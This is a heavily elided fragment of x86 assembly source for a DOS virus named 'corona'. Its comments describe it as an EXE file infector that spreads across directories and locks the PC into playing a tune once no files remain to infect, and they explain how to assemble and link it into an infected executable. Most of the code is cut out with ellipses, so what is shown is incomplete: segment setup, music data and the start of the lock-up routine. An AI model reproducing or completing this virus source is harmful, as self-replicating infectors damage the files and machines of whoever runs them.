;The corona virus is an EXE file infector which can jump from directory to
...
;corona also locks the pc into a 'coronaing' toon when it runs out
;of files to infect. (corona can be assembled to an .obj file under a86,
;then linked to the 'infected' .exe form.)

HOSTSEG SEGMENT BYTE
	ASSUME  CS:HOSTSEG,SS:HSTACK

PGMSTR  DB 'corona.EXE',0
...
;corona Virus code segment. This gains control first, before the host. As this
...
MUZIK   dw      4304,0006, 4063,0006, 4304,0006, 4063,0006, ;MUZIK - notes/delay
	...
	dw      0ffffh
;--------------------------------------------------------------------------
;corona virus main routine starts here
VIRUS:
	...
	jnz     TOON            ;returned nz - no valid files left, play coronaing toon!
...
;***************************************************************************
; This routine enables corona virus to compell the pc to play a 
;'coronaing' toon when it can't find a file to infect
;**************************************************************************
TOON:
	cli                          ;interrupts off
